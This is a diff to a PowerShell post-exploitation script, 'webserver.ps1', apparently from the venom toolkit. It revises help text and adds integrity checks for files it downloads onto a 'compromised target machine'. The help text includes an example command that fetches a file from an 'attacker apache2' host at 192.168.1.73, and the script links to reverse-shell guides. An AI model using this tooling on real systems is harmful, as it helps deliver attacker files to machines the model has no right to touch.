@@ -107,9 +107,9 @@
 .EXAMPLE
    PS C:\> .\webserver.ps1 -Download "192.168.1.73,CompDefaults.ps1"
    Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73)
-   webroot to @webserver remote working directory. This parameter can
-   NOT be used together with other parameters because after completing
-   is task (Download file) it exits.
+   webroot into @webserver remote working directory. This parameter
+   can NOT be used together with other parameters because after
+   completing is task (Download file) it exits execution.
 
 .INPUTS
    None. You cannot pipe objects into webserver.ps1
@@ -123,6 +123,7 @@
     https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
     https://github.com/r00t-3xp10it/venom/wiki/cmdlet-to-download-files-from-compromised-target-machine
 #>
+
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
@@ -185,11 +186,12 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    .NOTES
       File to Download must be stored in attacker apache2 webroot.
       Double quotes are mandatory in this parameter value inputs.
-      Localhost connections (127.0.0.1) are not supported.
+      Localhost connections (127.0.0.1) are not supported (obvious).
 
    .EXAMPLE
       PS C:\> .\webserver.ps1 -Download "192.168.1.73,CompDefaults.ps1"
-      Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73).
+      Downloads CompDefaults.ps1 from attacker apache2 (192.168.1.73)
+      into @webserver remote working directory [< -SPath >] parameter.
    #>
 
    Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor Green;Start-Sleep -Seconds 1
@@ -214,17 +216,17 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver  
    }
 
-   ## Make sure that the download file its not a 'DOCTYPE html' document
+   ## Check for downloaded file integrity
    If(-not($FileName -iMatch '[.exe]$')){## This test does not work on binary files (.exe)
       $Status = Get-Content -Path "$Initial_Path\$FileName" -EA SilentlyContinue
       If($Status -iMatch '^(<!DOCTYPE html)'){
-         Write-Host "[abort] $FileName download corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "[abort] $FileName Download Corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }ElseIf($Status -iMatch '^(404)'){
-         Write-Host "[abort] $FileName not found in remote server (404)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "[abort] $FileName Not found in Remote Server (404)" -ForeGroundColor Red -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }ElseIf($Status -ieq $Null){
-         Write-Host "[abort] $FileName not found in remote server (`$Null)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "[abort] $FileName `$null Content Detected (corrupted)" -ForeGroundColor Red -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }Else{
          ## File successfuly Downloaded
@@ -232,6 +234,14 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
       }
    }
 
+   ## Check for downloaded Binary integrity
+   If($FileName -iMatch '[.exe]$'){## Binary file download detected
+      $SizeDump = ((Get-Item "$Initial_Path\$FileName" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 80){## Make sure Curl|BitsTransfer download is not corrupted
+         Write-Host "[abort] $FileName Length: $SizeDump/KB Integrity Corrupted" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
+      }
+   }
 
    ## Build Object-Table Display
    If(Test-Path -Path "$Initial_Path\$FileName"){
